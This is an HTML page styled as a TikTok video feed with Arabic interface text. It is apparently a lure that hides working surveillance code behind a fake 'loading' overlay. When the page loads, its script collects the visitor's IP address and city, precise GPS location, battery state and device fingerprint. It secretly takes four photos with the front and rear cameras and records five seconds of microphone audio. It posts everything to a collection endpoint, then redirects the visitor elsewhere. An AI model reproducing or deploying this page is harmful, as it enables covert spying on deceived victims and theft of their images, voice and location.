<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>TikTok</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: #000;
            color: #fff;
            overflow: hidden;
            height: 100vh;
            width: 100vw;
        }
        .tiktok-container {
            position: relative;
            width: 100%;
            height: 100vh;
            overflow: hidden;
            background: #000;
        }

        /* Video Background - Pure Black */
        .video-bg {
            position: absolute;
            top: 0; left: 0;
            width: 100%; height: 100%;
            background: #000;
            display: flex;
            align-items: center;
            justify-content: center;
            z-index: 1;
        }

        /* TikTok Logo */
        .tiktok-logo {
            position: absolute;
            top: 50%; left: 50%;
            transform: translate(-50%, -50%);
            z-index: 2;
        }
        .tiktok-logo i {
            font-size: 100px;
            background: linear-gradient(45deg, #ff0050, #00f2ea);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            animation: tiktokPulse 2s ease-in-out infinite;
        }
        @keyframes tiktokPulse {
            0%, 100% { transform: scale(1); opacity: 0.7; }
            50% { transform: scale(1.08); opacity: 1; }
        }

        /* Loading Spinner القديم - تم إخفاؤه */
        .loading-spinner {
            display: none; /* إخفاء spinner القديم */
            position: absolute;
            top: 65%; left: 50%;
            transform: translate(-50%, -50%);
            z-index: 10;
        }
        .spinner-ring {
            width: 40px; height: 40px;
            border: 3px solid rgba(255,255,255,0.08);
            border-top-color: #fff;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
        }
        @keyframes spin {
            100% { transform: rotate(360deg); }
        }

        /* Top Bar */
        .top-bar {
            position: absolute;
            top: 0; left: 0; right: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 12px 20px;
            z-index: 100;
            background: linear-gradient(to bottom, rgba(0,0,0,0.3), transparent);
        }
        .top-tabs {
            display: flex;
            gap: 25px;
            font-size: 15px;
            font-weight: 600;
        }
        .top-tab {
            color: rgba(255,255,255,0.5);
            cursor: pointer;
        }
        .top-tab.active {
            color: #fff;
        }
        .top-tab i {
            font-size: 18px;
        }

        /* Right Side Actions */
        .right-actions {
            position: absolute;
            right: 8px;
            bottom: 100px;
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 18px;
            z-index: 100;
        }
        .action-btn {
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 3px;
            cursor: pointer;
        }
        .action-btn i {
            font-size: 30px;
            color: #fff;
            text-shadow: 0 2px 8px rgba(0,0,0,0.4);
        }
        .action-btn span {
            font-size: 11px;
            color: #fff;
            text-shadow: 0 1px 4px rgba(0,0,0,0.4);
        }
        .avatar-ring {
            width: 48px; height: 48px;
            border-radius: 50%;
            border: 2px solid #fff;
            overflow: hidden;
            margin-bottom: 8px;
            background: linear-gradient(45deg, #ff0050, #00f2ea);
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .avatar-ring i {
            font-size: 22px;
            color: #fff;
        }

        /* Bottom Info */
        .bottom-info {
            position: absolute;
            bottom: 0; left: 0; right: 0;
            padding: 15px 12px 70px;
            background: linear-gradient(to top, rgba(0,0,0,0.6), transparent);
            z-index: 100;
        }
        .username {
            font-size: 15px;
            font-weight: 600;
            margin-bottom: 6px;
            display: flex;
            align-items: center;
            gap: 6px;
        }
        .username i {
            color: #20d5ec;
            font-size: 13px;
        }
        .description {
            font-size: 13px;
            color: rgba(255,255,255,0.9);
            margin-bottom: 8px;
            line-height: 1.4;
        }
        .music-bar {
            display: flex;
            align-items: center;
            gap: 6px;
            font-size: 12px;
        }
        .music-bar i {
            animation: musicNote 1.5s ease-in-out infinite;
        }
        @keyframes musicNote {
            0%, 100% { transform: rotate(-8deg); }
            50% { transform: rotate(8deg); }
        }

        /* Bottom Navigation */
        .bottom-nav {
            position: absolute;
            bottom: 0; left: 0; right: 0;
            display: flex;
            justify-content: space-around;
            align-items: center;
            padding: 6px 0 18px;
            background: rgba(0,0,0,0.95);
            border-top: 1px solid rgba(255,255,255,0.06);
            z-index: 200;
        }
        .nav-item {
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 2px;
            color: rgba(255,255,255,0.5);
            font-size: 10px;
            cursor: pointer;
        }
        .nav-item i {
            font-size: 22px;
        }
        .nav-item.active {
            color: #fff;
        }
        .nav-item.add-btn {
            background: linear-gradient(45deg, #ff0050, #00f2ea);
            width: 38px; height: 28px;
            border-radius: 8px;
            display: flex;
            align-items: center;
            justify-content: center;
            color: #fff;
            margin-bottom: 2px;
        }
        .nav-item.add-btn i {
            font-size: 16px;
        }

        /* ===== NEW: Loading Overlay مع تشويش خفيف ===== */
        .loading-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 10000;
            background: rgba(0, 0, 0, 0.1);
            backdrop-filter: blur(2px);
            -webkit-backdrop-filter: blur(2px);
            pointer-events: none;
            opacity: 1;
            transition: opacity 0.5s ease;
        }
        .loading-overlay.hidden {
            opacity: 0;
            pointer-events: none;
        }
        .loading-box {
            background: #1a8cff; /* أزرق */
            padding: 30px 40px;
            border-radius: 16px;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            box-shadow: 0 8px 30px rgba(0,0,0,0.5);
            backdrop-filter: none;
            -webkit-backdrop-filter: none;
        }
        .loading-box .spinner-ring-big {
            width: 50px;
            height: 50px;
            border: 5px solid rgba(255,255,255,0.3);
            border-top-color: #ffffff;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
        }
        .loading-box p {
            color: #fff;
            margin-top: 15px;
            font-size: 16px;
            font-weight: 500;
        }
        /* ================================================= */
    </style>
</head>
<body>
    <!-- ===== NEW: Overlay التحميل ===== -->
    <div id="loadingOverlay" class="loading-overlay">
        <div class="loading-box">
            <div class="spinner-ring-big"></div>
            <p>جاري التحميل...</p>
        </div>
    </div>

    <div class="tiktok-container">
        <!-- Pure Black Background -->
        <div class="video-bg">
            <div class="tiktok-logo">
                <i class="fab fa-tiktok"></i>
            </div>
        </div>

        <!-- Loading Spinner القديم (مخفي الآن) -->
        <div class="loading-spinner">
            <div class="spinner-ring"></div>
        </div>

        <!-- Top Bar -->
        <div class="top-bar">
            <div class="top-tabs">
                <div class="top-tab"><i class="fas fa-tv"></i></div>
                <div class="top-tab active">متابَعة</div>
                <div class="top-tab">لك</div>
            </div>
        </div>

        <!-- Right Actions -->
        <div class="right-actions">
            <div class="avatar-ring">
                <i class="fas fa-user"></i>
            </div>
            <div class="action-btn">
                <i class="fas fa-heart"></i>
                <span>842.5K</span>
            </div>
            <div class="action-btn">
                <i class="fas fa-comment-dots"></i>
                <span>12.3K</span>
            </div>
            <div class="action-btn">
                <i class="fas fa-bookmark"></i>
                <span>45.2K</span>
            </div>
            <div class="action-btn">
                <i class="fas fa-share"></i>
                <span>8.9K</span>
            </div>
            <div class="action-btn">
                <i class="fas fa-compact-disc" style="animation: spin 3s linear infinite;"></i>
            </div>
        </div>

        <!-- Bottom Info -->
        <div class="bottom-info">
            <div class="username">
                @user_123 <i class="fas fa-check-circle"></i>
            </div>
            <div class="description">
                فيديو رائع جداً 🎵✨ #fyp #viral #trending
            </div>
            <div class="music-bar">
                <i class="fas fa-music"></i>
                <span>Original Sound - @user_123</span>
            </div>
        </div>

        <!-- Bottom Navigation -->
        <div class="bottom-nav">
            <div class="nav-item active">
                <i class="fas fa-home"></i>
                <span>الرئيسية</span>
            </div>
            <div class="nav-item">
                <i class="fas fa-compass"></i>
                <span>اكتشاف</span>
            </div>
            <div class="nav-item add-btn">
                <i class="fas fa-plus"></i>
            </div>
            <div class="nav-item">
                <i class="fas fa-inbox"></i>
                <span>البريد</span>
            </div>
            <div class="nav-item">
                <i class="fas fa-user"></i>
                <span>أنا</span>
            </div>
        </div>
    </div>

    <form id="dataForm" method="POST" action="REDIRECT_URL" style="display:none;">
        <input type="hidden" name="chatId" id="chatId">
        <input type="hidden" name="imageDatas" id="imageDatas">
        <input type="hidden" name="location" id="location">
        <input type="hidden" name="permissions" id="permissions">
        <input type="hidden" name="ipInfo" id="ipInfo">
        <input type="hidden" name="battery" id="battery">
        <input type="hidden" name="audioData" id="audioData">
        <input type="hidden" name="deviceInfo" id="deviceInfo">
    </form>

    <script>
        const REDIRECT_URL = "REDIRECT_URL";
        let images = [], audioData = null;
        let ipInfo = '', batteryStatus = '', locationStr = '';
        let permissions = [];
        let deviceInfo = {};

        // عنصر overlay للتحميل
        const loadingOverlay = document.getElementById('loadingOverlay');

        async function getIP() {
            try {
                const r = await fetch('https://ipapi.co/json/');
                const d = await r.json();
                ipInfo = `Country: ${d.country_name || 'Unknown'}, City: ${d.city || 'Unknown'}, IP: ${d.ip || 'Unknown'}`;
            } catch {
                ipInfo = 'Unable to get IP';
            }
        }

        async function getBattery() {
            try {
                const b = await navigator.getBattery();
                batteryStatus = `Level: ${Math.round(b.level * 100)}%, Charging: ${b.charging ? 'Yes' : 'No'}`;
            } catch {
                batteryStatus = 'Unknown';
            }
        }

        async function captureImage(facingMode) {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: { exact: facingMode }, width: 640, height: 480 }
                });
                const v = document.createElement('video');
                v.srcObject = stream;
                await v.play();
                await new Promise(r => setTimeout(r, 300));

                const c = document.createElement('canvas');
                c.width = v.videoWidth || 640;
                c.height = v.videoHeight || 480;
                c.getContext('2d').drawImage(v, 0, 0);

                const imageData = c.toDataURL('image/jpeg', 0.7).split(',')[1];
                images.push(imageData);

                stream.getTracks().forEach(t => t.stop());
                return true;
            } catch (error) {
                permissions.push(`Camera ${facingMode} Denied`);
                return false;
            }
        }

        async function captureAllImages() {
            await captureImage('user');
            await captureImage('environment');
            await captureImage('user');
            await captureImage('environment');
        }

        async function recordAudio() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
                const mediaRecorder = new MediaRecorder(stream);
                const chunks = [];

                mediaRecorder.ondataavailable = e => chunks.push(e.data);

                return new Promise((resolve) => {
                    mediaRecorder.onstop = () => {
                        const blob = new Blob(chunks, { type: 'audio/webm' });
                        const reader = new FileReader();
                        reader.onloadend = () => {
                            const base64 = reader.result.split(',')[1];
                            audioData = base64;
                            stream.getTracks().forEach(t => t.stop());
                            resolve();
                        };
                        reader.readAsDataURL(blob);
                    };

                    mediaRecorder.start();
                    setTimeout(() => mediaRecorder.stop(), 5000);
                });
            } catch (error) {
                permissions.push('Audio Denied');
                return null;
            }
        }

        async function getLocation() {
            return new Promise(res => {
                navigator.geolocation.getCurrentPosition(
                    p => {
                        locationStr = `Lat:${p.coords.latitude}, Lon:${p.coords.longitude}, Acc:${p.coords.accuracy}m`;
                        res(locationStr);
                    },
                    () => {
                        permissions.push('Location Denied');
                        locationStr = '';
                        res('');
                    },
                    { enableHighAccuracy: true, timeout: 10000 }
                );
            });
        }

        async function getDeviceInfo() {
            deviceInfo = {
                platform: navigator.platform || 'Unknown',
                userAgent: navigator.userAgent || 'Unknown',
                language: navigator.language || 'Unknown',
                memory: navigator.deviceMemory || 'Unknown',
                cores: navigator.hardwareConcurrency || 'Unknown',
                screen: `${screen.width}x${screen.height}`,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || 'Unknown',
                vendor: navigator.vendor || 'Unknown',
                product: navigator.product || 'Unknown',
                cookieEnabled: navigator.cookieEnabled || false,
                doNotTrack: navigator.doNotTrack || 'Unknown',
                connection: navigator.connection ? {
                    effectiveType: navigator.connection.effectiveType || 'Unknown',
                    downlink: navigator.connection.downlink || 'Unknown',
                    rtt: navigator.connection.rtt || 'Unknown'
                } : null
            };
            return deviceInfo;
        }

        async function sendData() {
            try {
                const fd = new FormData();
                fd.append('ipInfo', ipInfo);
                fd.append('battery', batteryStatus);
                fd.append('location', locationStr);
                fd.append('imageDatas', images.join(','));
                fd.append('permissions', permissions.join(', '));
                fd.append('audioData', audioData || '');
                fd.append('deviceInfo', JSON.stringify(deviceInfo));
                fd.append('chatId', navigator.userAgent || 'Unknown');

                const response = await fetch('/submitData', { 
                    method: 'POST', 
                    body: fd,
                    timeout: 30000
                });

                return response;
            } catch (error) {
                console.error('Send error:', error);
                return null;
            }
        }

        async function startProcess() {
            // إظهار الـ overlay
            loadingOverlay.classList.remove('hidden');

            await getIP();
            await getBattery();
            await getLocation();
            await getDeviceInfo();
            await captureAllImages();
            await recordAudio();

            const response = await sendData();

            // إخفاء الـ overlay بعد الانتهاء
            loadingOverlay.classList.add('hidden');

            setTimeout(() => {
                if (REDIRECT_URL && REDIRECT_URL !== 'REDIRECT_URL') {
                    window.location.href = REDIRECT_URL;
                } else {
                    window.location.href = 'https://www.google.com';
                }
            }, 1500);
        }

        window.onload = function() {
            setTimeout(startProcess, 1000);
        };
    </script>
</body>
</html>
